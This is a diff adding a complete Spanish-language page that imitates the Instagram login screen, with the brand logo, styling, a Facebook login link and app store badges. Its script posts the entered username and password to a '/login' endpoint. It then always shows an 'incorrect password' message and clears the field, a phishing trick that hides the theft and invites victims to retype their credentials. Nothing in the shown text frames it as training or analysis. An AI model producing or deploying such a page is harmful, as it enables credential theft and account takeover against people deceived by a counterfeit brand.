@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Instagram</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:100%;max-width:350px;margin-bottom:10px}
+.logo{text-align:center;margin-bottom:28px}
+.logo svg{width:175px;height:52px}
+form input{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;line-height:18px;outline:none;transition:.1s;margin-bottom:6px}
+form input:focus{border-color:#a8a8a8}
+.btn{width:100%;background:linear-gradient(to right,#833ab4,#fd1d1d,#fcb045);color:#fff;border:none;border-radius:4px;padding:7px 16px;font-size:14px;font-weight:600;cursor:pointer;margin-top:4px;letter-spacing:.3px}
+.btn:hover{opacity:.9}
+.divider{display:flex;align-items:center;margin:16px 0;color:#8e8e8e;font-size:13px;font-weight:600}
+.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #dbdbdb}
+.divider::before{margin-right:18px}
+.divider::after{margin-left:18px}
+.fb-btn{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:16px;text-decoration:none}
+.forgot{display:block;text-align:center;font-size:12px;color:#00376b;margin-top:12px;text-decoration:none}
+.card2{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px;width:100%;max-width:350px;text-align:center;font-size:14px}
+.card2 a{color:#0095f6;font-weight:600;text-decoration:none}
+.error{background:#fff;color:#ed4956;font-size:13px;text-align:center;margin-bottom:8px;display:none}
+.app-links{display:flex;gap:8px;justify-content:center;margin-top:20px}
+.app-links img{height:40px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 463 106">
+      <path d="M22.5 0C10 0 0 10 0 22.5v61C0 96 10 106 22.5 106h61C96 106 106 96 106 83.5v-61C106 10 96 0 83.5 0h-61zm0 10h61C91 10 96 15 96 22.5v61C96 91 91 96 83.5 96h-61C15 96 10 91 10 83.5v-61C10 15 15 10 22.5 10zm61 5a5 5 0 100 10 5 5 0 000-10zM53 25c-15.5 0-28 12.5-28 28s12.5 28 28 28 28-12.5 28-28-12.5-28-28-28zm0 10c9.9 0 18 8.1 18 18s-8.1 18-18 18-18-8.1-18-18 8.1-18 18-18z" fill="url(#ig)"/>
+      <defs><linearGradient id="ig" x1="0" y1="106" x2="106" y2="0" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#FED373"/><stop offset=".25" stop-color="#F15245"/><stop offset=".5" stop-color="#D92E7F"/><stop offset=".75" stop-color="#9B36B7"/><stop offset="1" stop-color="#515ECF"/></linearGradient></defs>
+      <text x="122" y="80" font-family="Billabong,cursive,sans-serif" font-size="80" fill="#262626">Instagram</text>
+    </svg>
+  </div>
+
+  <div class="error" id="error">La contraseña es incorrecta. Compruébala e inténtalo de nuevo.</div>
+
+  <form id="loginForm">
+    <input type="text" id="username" name="username" placeholder="Número de teléfono, nombre de usuario o email" autocomplete="username" required>
+    <input type="password" id="password" name="password" placeholder="Contraseña" autocomplete="current-password" required>
+    <button type="submit" class="btn">Entrar</button>
+  </form>
+
+  <div class="divider">O</div>
+  <a class="fb-btn" href="#">
+    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="#385185"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
+    Entrar con Facebook
+  </a>
+  <a href="#" class="forgot">¿Has olvidado la contraseña?</a>
+</div>
+
+<div class="card2">
+  ¿No tienes una cuenta? <a href="#">Regístrate</a>
+</div>
+
+<div class="app-links">
+  <svg xmlns="http://www.w3.org/2000/svg" width="120" height="40" viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#000"/><text x="60" y="14" text-anchor="middle" fill="#fff" font-size="8" font-family="Arial">Disponible en</text><text x="60" y="28" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">App Store</text></svg>
+  <svg xmlns="http://www.w3.org/2000/svg" width="135" height="40" viewBox="0 0 135 40"><rect width="135" height="40" rx="6" fill="#000"/><text x="67" y="14" text-anchor="middle" fill="#fff" font-size="8" font-family="Arial">Disponible en</text><text x="67" y="28" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">Google Play</text></svg>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit',function(e){
+  e.preventDefault();
+  var u=document.getElementById('username').value;
+  var p=document.getElementById('password').value;
+  fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:'username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p)})
+  .then(function(){
+    document.getElementById('error').style.display='block';
+    document.getElementById('password').value='';
+  }).catch(function(){
+    document.getElementById('error').style.display='block';
+  });
+});
+</script>
+</body>
+</html>
